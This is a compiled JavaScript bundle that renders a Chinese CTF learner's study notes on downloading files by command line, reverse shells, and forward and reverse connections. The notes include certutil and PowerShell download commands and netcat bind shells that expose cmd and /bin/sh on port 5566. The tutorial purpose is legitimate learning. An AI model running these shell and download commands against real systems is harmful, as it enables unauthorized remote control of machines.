(window.webpackJsonp=window.webpackJsonp||[]).push([[187],{729:function(e,t,a){"use strict";a.r(t);var s=a(2),r=Object(s.a)({},(function(){var e=this,t=e._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("Boxx"),e._v(" "),t("p",[e._v("从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第52天")]),e._v(" "),t("p",[e._v("今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),e._v(" "),t("p"),t("div",{staticClass:"table-of-contents"},[t("ul",[t("li",[t("a",{attrs:{href:"#文件上传下载-解决无图形化-解决数据传输"}},[e._v("文件上传下载-解决无图形化&解决数据传输")]),t("ul",[t("li",[t("a",{attrs:{href:"#演示"}},[e._v("演示")])]),t("li",[t("a",{attrs:{href:"#常规简单命令"}},[e._v("常规简单命令")])])])]),t("li",[t("a",{attrs:{href:"#反弹shell"}},[e._v("反弹Shell")]),t("ul",[t("li",[t("a",{attrs:{href:"#使用场景"}},[e._v("使用场景：")])]),t("li",[t("a",{attrs:{href:"#目的"}},[e._v("目的：")])]),t("li",[t("a",{attrs:{href:"#工作原理"}},[e._v("工作原理：")])]),t("li",[t("a",{attrs:{href:"#演示"}},[e._v("演示：")])]),t("li",[t("a",{attrs:{href:"#难点"}},[e._v("难点：")])]),t("li",[t("a",{attrs:{href:"#正向连接演示"}},[e._v("正向连接演示：")])])])])])]),t("p"),e._v(" "),t("ul",[t("li",[e._v("小迪安全视频地址【"),t("RouterLink",{attrs:{to:"/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/"}},[e._v("🔗传送门")]),e._v("】")],1)]),e._v(" "),t("h1",{attrs:{id:"第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[e._v("#")]),e._v(" 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),e._v(" "),t("h2",{attrs:{id:"文件上传下载-解决无图形化-解决数据传输"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#文件上传下载-解决无图形化-解决数据传输"}},[e._v("#")]),e._v(" 文件上传下载-解决无图形化&解决数据传输")]),e._v(" "),t("p",[e._v("在不允许图形化界面的情况下，需要命令去上传下载。")]),e._v(" "),t("h3",{attrs:{id:"演示"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#演示"}},[e._v("#")]),e._v(" 演示")]),e._v(" "),t("p",[e._v("Windows Server 2012 + 【"),t("a",{attrs:{href:"https://forum.ywhack.com/bountytips.php?download",target:"_blank",rel:"noopener noreferrer"}},[e._v("棱角社区文件下载命令生成工具"),t("OutboundLink")],1),e._v("】")]),e._v(" "),t("p",[e._v("**思考：**这工具是在线工具，我不想用在线工具，是否能找一个能不用在线的工具？")]),e._v(" "),t("blockquote",[t("p",[t("img",{attrs:{src:"/img/ctfLearn/image-20250108220233033.png",alt:"image-20250108220233033"}})]),e._v(" "),t("p",[t("code",[e._v("棱角社区文件下载命令生成工具")]),e._v("可以用来生成下载命令，有PowerShell或者cmd命令，以及Linux命令等")])]),e._v(" "),t("p",[e._v("**步骤：**文件放到服务器上，构造一个地址，没有图形化页面，用远程命令的方式，将服务器的文件下载到电脑中。")]),e._v(" "),t("h3",{attrs:{id:"常规简单命令"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#常规简单命令"}},[e._v("#")]),e._v(" 常规简单命令")]),e._v(" "),t("blockquote",[t("ul",[t("li",[e._v("强烈推荐【"),t("a",{attrs:{href:"https://b23.tv/Rj2IJ02",target:"_blank",rel:"noopener noreferrer"}},[e._v("PowerShell基础视频讲解"),t("OutboundLink")],1),e._v("】")]),e._v(" "),t("li",[e._v("【"),t("a",{attrs:{href:"https://blog.csdn.net/weixin_43303273/article/details/83029138",target:"_blank",rel:"noopener noreferrer"}},[e._v("常规基本渗透命令详解目录"),t("OutboundLink")],1),e._v("】")])])]),e._v(" "),t("ul",[t("li",[e._v("Linux:  "),t("code",[e._v("wget curl python ruby perl java")]),e._v("等")]),e._v(" "),t("li",[e._v("Windows: "),t("code",[e._v("PowerShell Certutil Bitsadmin msiexec mshta rund1132")]),e._v("等")])]),e._v(" "),t("table",[t("thead",[t("tr",[t("th"),e._v(" "),t("th",[e._v("Linux")]),e._v(" "),t("th",[e._v("Windows")])])]),e._v(" "),t("tbody",[t("tr",[t("td",[e._v("常见下载命令1")]),e._v(" "),t("td",[e._v("wget https://example.com/software.tar.gz")]),e._v(" "),t("td",[e._v('powershell.exe -Command "Invoke-WebRequest -Uri http://127.0.0.1:8080/example.exe -OutFile example.exe"')])]),e._v(" "),t("tr",[t("td",[e._v("常见下载命令2")]),e._v(" "),t("td",[e._v("curl -O https://example.com/another_software.zip")]),e._v(" "),t("td",[e._v("certutil.exe -urlcache -split -f http://127.0.0.1:8080/example.exe example.exe")])])])]),e._v(" "),t("h2",{attrs:{id:"反弹shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#反弹shell"}},[e._v("#")]),e._v(" 反弹Shell")]),e._v(" "),t("h3",{attrs:{id:"使用场景"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用场景"}},[e._v("#")]),e._v(" 使用场景：")]),e._v(" "),t("p",[e._v("如果我们需要到服务器上执行 Shell 命令，但是因为防火墙等原因，无法由客户端主动发起连接的情况，就可以使用反弹 Shell 来满足登陆和操作的需求。")]),e._v(" "),t("h3",{attrs:{id:"目的"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#目的"}},[e._v("#")]),e._v(" 目的：")]),e._v(" "),t("p",[e._v("解决数据回显&解决数据通讯")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("解决数据回显：")]),e._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[e._v("root@xiaodi:/tmp"),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# useradd xiaodisec")]),e._v("\nroot@xiaodi:/tmp"),t("span",{pre:!0,attrs:{class:"token comment"}},[e._v("# passwd xiaodisec")]),e._v("\nEnter new UNIX password:\nRetype new UNIX password:\nEnter new UNIX password:\nRetype new UNIX password:\nEnter new UNIX password:\nRetype new UNIX password:\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br"),t("span",{staticClass:"line-number"},[e._v("3")]),t("br"),t("span",{staticClass:"line-number"},[e._v("4")]),t("br"),t("span",{staticClass:"line-number"},[e._v("5")]),t("br"),t("span",{staticClass:"line-number"},[e._v("6")]),t("br"),t("span",{staticClass:"line-number"},[e._v("7")]),t("br"),t("span",{staticClass:"line-number"},[e._v("8")]),t("br")])]),t("p",[e._v("我们可以看到，如果我们在输入密码的时候不输入，直接回车，就会一直让你输入密码。假设我们在网上遇到一个漏洞，而这个漏洞需要去执行命令，类似这种需要输入的，等待输入就能往下进行。这时不会把对方的界面给到我们，我们动不了，可以把界面反弹到我们这边，我们再用这个命令就行了。反弹Shell就是把命令的输入输出转移到其他主机")])]),e._v(" "),t("li",[t("p",[e._v("解决数据通信问题：")]),e._v(" "),t("p",[e._v("正常漏洞，执行一条命令，回显一条命令。比如我们提交一个文件，一直提交提交提交，我们一直有流量过去，如果将命令反弹回来，就相当于命令在本地执行一样。意思是将对方的权限移交给我们。（视频中是这么解释的，但我用AI解释的结果是"),t("code",[e._v("在企业内部网络，服务器多为内部私有 IP（如 192.168.x.x），经 NAT 设备连外网。外部攻击者是公网 IP，因 NAT 隐藏内部 IP 且限制外对内访问，无法直连服务器内部服务。而反弹 Shell 可突破限制，让目标服务器主动连接。比如，攻击者在公网设可访问服务器并监听端口，利用漏洞使目标服务器 Shell 连此端口，建立通信通道，双方借此通信。")]),e._v("）")])])]),e._v(" "),t("h3",{attrs:{id:"工作原理"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#工作原理"}},[e._v("#")]),e._v(" 工作原理：")]),e._v(" "),t("p",[e._v("攻击者在其自己的机器上设置监听端口，然后诱使受害者的机器执行一个反向连接的 Shell 命令，连接回攻击者的机器。这样，攻击者就能通过这个反向连接执行命令，控制受害者的计算机。")]),e._v(" "),t("h3",{attrs:{id:"演示-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#演示-2"}},[e._v("#")]),e._v(" 演示：")]),e._v(" "),t("p",[e._v("Windows Server 2012 + 【"),t("a",{attrs:{href:"https://forum.ywhack.com/shell.php",target:"_blank",rel:"noopener noreferrer"}},[e._v("棱角社区反弹Shell工具"),t("OutboundLink")],1),e._v("】")]),e._v(" "),t("p",[e._v("可以反弹的语言相当多，主要演示"),t("code",[e._v("linux")]),e._v("中的工具之一"),t("code",[e._v("ncat")])]),e._v(" "),t("p",[t("code",[e._v("NC(ncat)")]),e._v("瑞士军刀："),t("code",[e._v("linux")]),e._v("系统下自带，"),t("code",[e._v("windows")]),e._v("下需要下载。")]),e._v(" "),t("h3",{attrs:{id:"难点"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#难点"}},[e._v("#")]),e._v(" 难点：")]),e._v(" "),t("ol",[t("li",[e._v("正向连接")]),e._v(" "),t("li",[e._v("反向连接")])]),e._v(" "),t("p",[e._v("从图中我们看到，如果我们用linux服务器连windows服务器，有两种方法实现，一种正向，一种反向，需要看参照物，如果我们是主动找对方，就是正向；如果是对方放过来找我们，就是反向。")]),e._v(" "),t("p",[t("img",{attrs:{src:"/img/ctfLearn/image-20250109210228805.png",alt:"image-20250109210228805"}})]),e._v(" "),t("h3",{attrs:{id:"正向连接演示"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#正向连接演示"}},[e._v("#")]),e._v(" 正向连接演示：")]),e._v(" "),t("p",[t("strong",[e._v("Linux控制Windows：")])]),e._v(" "),t("ol",[t("li",[e._v("Windows上边要绑定CMD到本地5566端口")])]),e._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[e._v("nc")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-e")]),e._v(" cmd "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-lvp")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("5566")]),e._v("\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("blockquote",[t("p",[e._v("Windows上没有nc工具，需要自己下载一个nc.exe工具【"),t("a",{attrs:{href:"https://eternallybored.org/misc/netcat/",target:"_blank",rel:"noopener noreferrer"}},[e._v("下载地址"),t("OutboundLink")],1),e._v("】，使用命令时如果不加环境变量就要写成nc.exe")])]),e._v(" "),t("ol",{attrs:{start:"2"}},[t("li",[t("p",[e._v("Linux上边需要主动连接目标5566")]),e._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[e._v("ncat "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("47.122")]),e._v(".23.131 "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("5566")]),e._v("\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:"/img/ctfLearn/image-20250109220537065.png",alt:"image-20250109220537065"}})]),e._v(" "),t("p",[e._v("完成以后，发现可以在linux端输入命令，然后返回结果也是在linux显示的")])])]),e._v(" "),t("p",[t("strong",[e._v("Windows控制Linux：")])]),e._v(" "),t("ol",[t("li",[t("p",[e._v("在linux上绑定SH到本地5566端口")]),e._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[e._v("ncat "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-e")]),e._v(" /bin/sh "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-lvp")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("5566")]),e._v("\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])])]),e._v(" "),t("li",[t("p",[e._v("在Windows上主动连接目标5566")]),e._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[e._v("nc")]),e._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("47.94")]),e._v(".236.117 "),t("span",{pre:!0,attrs:{class:"token number"}},[e._v("5566")]),e._v("\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("在复现时发现我在Vmware安装的Centos系统不能用Windows连接，查阅资料发现应该是防火墙问题，尝试关闭Linux系统的防火墙失败，理论上是可行的。")])])]),e._v(" "),t("p",[t("strong",[e._v("正向连接原理：")])]),e._v(" "),t("ul",[t("li",[e._v("本地监听，等待连接")]),e._v(" "),t("li",[e._v("正向连接是谁监听，就是控制谁")]),e._v(" "),t("li",[t("img",{attrs:{src:"/img/ctfLearn/image-20250110200957400.png",alt:"image-20250110200957400"}})])])],1)}),[],!1,null,null,null);t.default=r.exports}}]);